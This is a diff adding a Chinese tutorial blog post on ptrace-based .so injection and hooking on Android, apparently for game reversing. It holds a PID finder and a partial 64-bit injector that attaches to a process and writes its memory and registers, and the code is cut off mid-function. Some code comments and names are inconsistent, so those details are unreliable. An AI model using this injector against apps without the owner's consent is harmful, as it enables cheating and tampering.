@@ -173,6 +173,355 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-note/rev/game-1" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/01/19/note/rev/game-1/" class="article-date">
+  	<time datetime="2021-01-19T14:10:11.000Z" itemprop="datePublished">2021-01-19</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/01/19/note/rev/game-1/">
+        Android下实现ptrace注入&amp;hook
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li>通过目标进程名找到进程PID</li>
+<li>将so注入到进程空间</li>
+<li>如果hook Native层函数，则有IAT hook，调试hook，inline hook，hotfix hook等多种手段；如果是Java层hook，可以使用反射机制</li>
+</ol>
+<h2 id="使用ndk编译linux原生应用程序"><a href="#使用ndk编译linux原生应用程序" class="headerlink" title="使用ndk编译linux原生应用程序"></a>使用ndk编译linux原生应用程序</h2><p>建立工程文件夹，工程文件夹内建立jni文件夹</p>
+<p>进入jni文件夹</p>
+<p>创建源文件，Android.mk，Application.mk</p>
+<p>Android.mk</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 一个Android.mk file首先必须定义好LOCAL_PATH变量。</span></span><br><span class="line"><span class="comment"># 它用于在开发树中查找源文件。在这个例子中，宏函数’my-dir’, </span></span><br><span class="line"><span class="comment"># 由编译系统提供，用于返回当前路径（即包含Android.mk file文件的目录）。</span></span><br><span class="line">LOCAL_PATH := <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"><span class="comment"># CLEAR_VARS由编译系统提供，</span></span><br><span class="line"><span class="comment"># 指定让GNU MAKEFILE为你清除许多LOCAL_XXX变量（例如 LOCAL_MODULE, LOCAL_SRC_FILES, LOCAL_STATIC_LIBRARIES, 等等...),除LOCAL_PATH 。这是必要的，</span></span><br><span class="line"><span class="comment"># 因为所有的编译控制文件都在同一个GNU MAKE执行环境中，所有的变量都是全局的。</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line"><span class="comment"># LOCAL_MODULE变量必须定义，以标识你在Android.mk文件中描述的每个模块。名称必须是唯一的，而且不包含任何空格。</span></span><br><span class="line"><span class="comment"># 注意编译系统会自动产生合适的前缀和后缀，换句话说，一个被命名为&#x27;foo&#x27;的共享库模块，将会生成&#x27;libfoo.so&#x27;文件。</span></span><br><span class="line">LOCAL_MODULE    := hello-jni</span><br><span class="line"><span class="comment"># LOCAL_SRC_FILES变量必须包含将要编译打包进模块中的C或C++源代码文件。注意，你不用在这里列出头文件和包含文件，</span></span><br><span class="line"><span class="comment"># 因为编译系统将会自动为你找出依赖型的文件；仅仅列出直接传递给编译器的源代码文件就好。</span></span><br><span class="line">LOCAL_SRC_FILES := hello-jni.c</span><br><span class="line"><span class="comment"># BUILD_EXECUTABLE 表示以一个可执行程序的方式进行编译</span></span><br><span class="line"><span class="comment"># BUILD_SHARED_LIBRARY 表示动态链接库的方式进行编译</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_EXECUTABLE)</span></span><br></pre></td></tr></table></figure>
+<p>fpid是你的目标文件名，1.c是源文件名</p>
+<p>Application.mk</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#### APP_ABI := arm64-v8a 后面接的是需要生成的.so平台文件，</span></span><br><span class="line"><span class="comment">#### 正常手机使用arm64处理器的即可。 all是全平台</span></span><br><span class="line"><span class="comment">#### APP_PLATFORM :=后面接的是使用SDK的最低等级</span></span><br><span class="line">APP_ABI := all</span><br></pre></td></tr></table></figure>
+<p>然后进入工程目录执行</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ndk-build</span><br></pre></td></tr></table></figure>
+<p>在libs目录下可以找到编译好的文件，使用adb push命令可以送到手机</p>
+<h2 id="查找PID"><a href="#查找PID" class="headerlink" title="查找PID"></a>查找PID</h2><p>主要是利用了linux的文件系统，/proc存储着进程有关信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PATH 256</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">findPIdByName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> pDirId = <span class="number">0</span>; <span class="comment">// process dir id</span></span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">char</span> filename[MAX_PATH]; </span><br><span class="line">    <span class="keyword">char</span> cmdline[MAX_PATH];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dirent</span> *<span class="title">entry</span>=<span class="title">NULL</span>;</span></span><br><span class="line">    <span class="keyword">int</span> cnt;</span><br><span class="line">    <span class="keyword">if</span>(name==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DIR *dir = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(dir==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>((entry=readdir(dir))!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">        pDirId=atoi(entry-&gt;d_name); </span><br><span class="line">        <span class="keyword">if</span>(pDirId!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">snprintf</span>(filename,MAX_PATH,<span class="string">&quot;/proc/%d/cmdline&quot;</span>,pDirId);</span><br><span class="line">            f = fopen(filename,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(f)&#123;</span><br><span class="line">                fgets(cmdline,<span class="keyword">sizeof</span>(cmdline),f);</span><br><span class="line">                cnt = (<span class="keyword">int</span>)<span class="built_in">strlen</span>(cmdline);</span><br><span class="line">                <span class="keyword">while</span>(cnt&gt;=<span class="number">0</span>&amp;&amp;cmdline[cnt]!=<span class="string">&#x27;/&#x27;</span>)cnt--; <span class="comment">// cmdline是完整路径，这里只找最后一个/之后的，就是可执行文件的文件名</span></span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(name,&amp;cmdline[cnt],<span class="built_in">strlen</span>(name)))&#123;</span><br><span class="line">                    pid=pDirId;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose(f);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closedir(dir);</span><br><span class="line">    <span class="keyword">return</span> pid; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>**argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc!=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;usage: fpid processname\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pid_t</span> pid = findPIdByName(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,pid);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="注入so"><a href="#注入so" class="headerlink" title="注入so"></a>注入so</h2><p>步骤</p>
+<ol>
+<li>attach到目标进程</li>
+<li>保存寄存器上下文</li>
+<li>调用mmap函数分配内存空间-这里主要为了传递一些字符串参数</li>
+<li>向内存空间写入加载模块名和调用函数</li>
+<li>调用dlopen打开注入模块</li>
+<li>调用dlsym获取调用函数的地址</li>
+<li>调用被注入模块的函数</li>
+<li>恢复寄存器环境</li>
+<li>从远程进程detach</li>
+</ol>
+<p>64位注入器</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;elf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pt_regs user_pt_regs</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> uregs	regs</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARM_pc	pc</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARM_sp	sp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARM_cpsr	pstate</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARM_lr		regs[30]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ARM_r0		regs[0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PTRACE_GETREGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_GETREGS PTRACE_GETREGSET</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PTRACE_SETREGS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTRACE_SETREGS PTRACE_SETREGSET</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CPSR_T_MASK (1u&lt;&lt;5)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PATH 512</span></span><br><span class="line"><span class="keyword">char</span> libcPath[]=<span class="string">&quot;/system/lib64/libc.so&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceWriteData</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">void</span>*addr,<span class="keyword">const</span> <span class="keyword">char</span>*data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;len;i+=<span class="keyword">sizeof</span>(<span class="keyword">long</span>))&#123;</span><br><span class="line">        ptrace(PTRACE_POKETEXT,pid,(<span class="keyword">long</span>)addr+i,(<span class="keyword">void</span>*)*(<span class="keyword">long</span>*)&amp;data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 每次写sizeof(long)字节，直接对齐</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceReadData</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">void</span>*addr,<span class="keyword">char</span>*data,<span class="keyword">size_t</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> rdata;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;len;i+=<span class="keyword">sizeof</span>(<span class="keyword">long</span>))&#123;</span><br><span class="line">        rdata=ptrace(PTRACE_PEEKTEXT,pid,(<span class="keyword">long</span>)addr+i,<span class="literal">NULL</span>);</span><br><span class="line">        *(<span class="keyword">long</span>*)&amp;data[i]=rdata;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceAttach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_ATTACH,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INJECT F]Failed to attach:%d\n&quot;</span>,pid);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> stat=<span class="number">0</span>;</span><br><span class="line">    waitpid(pid,&amp;stat,WUNTRACED);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceGetRegs</span><span class="params">(<span class="keyword">pid_t</span> pid,struct pt_regs*regs_addr)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span>;</span></span><br><span class="line">    io.iov_base=regs_addr;</span><br><span class="line">    io.iov_len=<span class="keyword">sizeof</span>(struct pt_regs);</span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_GETREGS,pid,NT_PRSTATUS,&amp;io)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Get regs error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceSetRegs</span><span class="params">(<span class="keyword">pid_t</span> pid,struct pt_regs*regs_addr)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">io</span>;</span></span><br><span class="line">    io.iov_base = regs_addr;</span><br><span class="line">    io.iov_len = <span class="keyword">sizeof</span>(struct pt_regs);</span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_SETREGS,pid,NT_PRSTATUS,&amp;io)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Set regs error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceDetach</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>&#123;</span><br><span class="line">    ptrace(PTRACE_DETACH,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ptraceContinue</span><span class="params">(<span class="keyword">pid_t</span> pid)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ptrace(PTRACE_CONT,pid,<span class="literal">NULL</span>,<span class="literal">NULL</span>)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ptrace continue error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">getModuleBaseAddr</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">const</span> <span class="keyword">char</span>*moduleName)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(pid==<span class="number">-1</span>)pid=getpid();</span><br><span class="line">    <span class="comment">// 通过解析/proc/pid/maps 获得基址</span></span><br><span class="line">    <span class="keyword">char</span> filepath[MAX_PATH];</span><br><span class="line">    <span class="keyword">void</span>*moduleBaseAddr=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(filepath,MAX_PATH,<span class="string">&quot;/proc/%d/maps&quot;</span>,pid);</span><br><span class="line">    FILE *f = fopen(filepath,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> line[MAX_PATH];</span><br><span class="line">    <span class="keyword">char</span> base[MAX_PATH],name[MAX_PATH];</span><br><span class="line">    <span class="keyword">size_t</span> cnt,start;</span><br><span class="line">    <span class="keyword">while</span>(!feof(f))&#123;</span><br><span class="line">        <span class="built_in">memset</span>(line,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">        <span class="built_in">memset</span>(name,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">        fgets(line,MAX_PATH,f);</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(line[cnt]!=<span class="string">&#x27;/&#x27;</span>)cnt++;</span><br><span class="line">        start=cnt;</span><br><span class="line">        <span class="keyword">while</span>(line[cnt])&#123;</span><br><span class="line">            name[cnt-start]=line[cnt];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        name[cnt-start<span class="number">-1</span>]=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strncmp</span>(name,moduleName,MAX_PATH))<span class="keyword">continue</span>;</span><br><span class="line">        <span class="built_in">memset</span>(base,<span class="number">0</span>,MAX_PATH);</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(line[cnt]!=<span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">            base[cnt]=line[cnt];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        base[cnt]=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">sscanf</span>(base,<span class="string">&quot;%llx&quot;</span>,(<span class="keyword">long</span> <span class="keyword">long</span>*)(&amp;moduleBaseAddr));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] GotBaseAddr %p of %s\n&quot;</span>,moduleBaseAddr,moduleName);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(f);</span><br><span class="line">    <span class="keyword">return</span> moduleBaseAddr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">getRemoteFuncAddr</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">const</span> <span class="keyword">char</span> *moduleName,<span class="keyword">void</span> *localFuncAddr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *localModuleAddr,*remoteModuleAddr,*remoteFuncAddr;</span><br><span class="line">    <span class="comment">// 通过计算指定函数的偏移量获取目标函数地址</span></span><br><span class="line">    localModuleAddr = getModuleBaseAddr(<span class="number">-1</span>,moduleName);</span><br><span class="line">    remoteModuleAddr = getModuleBaseAddr(pid,moduleName);</span><br><span class="line">    remoteFuncAddr=(<span class="keyword">void</span>*)((<span class="keyword">long</span>)localFuncAddr-(<span class="keyword">long</span>)localModuleAddr+(<span class="keyword">long</span>)remoteModuleAddr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[INJECT] GotFuncAddr:%p\n&quot;</span>,remoteFuncAddr);</span><br><span class="line">    <span class="keyword">return</span> remoteFuncAddr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptraceCall</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">void</span>* funcAddr,<span class="keyword">long</span>*paras,<span class="keyword">long</span> paraLen,struct pt_regs *regs)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 多于8个参数通过栈传递</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(paraLen&gt;<span class="number">8</span>)&#123;</span><br><span class="line"></span><br><span class="line">        regs-&gt;ARM_sp-=(paraLen<span class="number">-8</span>)*<span class="keyword">sizeof</span>(<span class="keyword">long</span>);</span><br><span class="line">        ptraceWriteData(pid,(<span class="keyword">void</span>*)regs-&gt;ARM_sp,(<span class="keyword">char</span>*)&amp;paras[<span class="number">6</span>],<span class="keyword">sizeof</span>(<span class="keyword">long</span>)*(paraLen<span class="number">-6</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 前6个参数通过寄存器传递</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span 